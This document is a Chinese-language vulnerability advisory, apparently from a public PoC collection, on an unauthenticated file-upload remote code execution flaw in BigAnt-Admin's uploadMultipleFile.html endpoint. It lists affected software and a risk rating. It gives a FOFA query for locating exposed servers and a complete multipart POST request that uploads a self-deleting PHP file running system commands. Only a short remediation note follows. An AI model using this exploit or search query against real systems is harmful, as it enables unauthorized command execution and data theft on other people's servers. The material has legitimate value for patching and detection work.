#  杭州九麒科技 BigAnt-Admin uploadMultipleFile.html 文件上传致RCE漏洞

# 漏洞描述

杭州九麒科技 BigAnt-Admin uploadMultipleFile.html 文件上传致RCE漏洞。这使得未经身份验证的攻击者可以在服务器上传文件执行任意命令，获取敏感数据，实现代码执行。

# 影响版本

杭州九麒科技 BigAnt-Admin

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="BigAnt-Admin"

POC/EXP：

```
POST /Addin/Upload/uploadMultipleFile.html HTTP/1.1
Host: 127.0.0.1
Accept: text/html, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1zY65etyNeQDfyjX
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

------WebKitFormBoundary1zY65etyNeQDfyjX
Content-Disposition: form-data; name="file"; filename="rce.php"

<?php system("whoami");unlink(__FILE__);?>
------WebKitFormBoundary1zY65etyNeQDfyjX--
```

![image-20250324092857967](./.resource/杭州九麒科技BigAnt-AdminuploadMultipleFile.html文件上传致RCE漏洞/media/image-20250324092857967.png)


![image-20250324092926721](./.resource/杭州九麒科技BigAnt-AdminuploadMultipleFile.html文件上传致RCE漏洞/media/image-20250324092926721.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
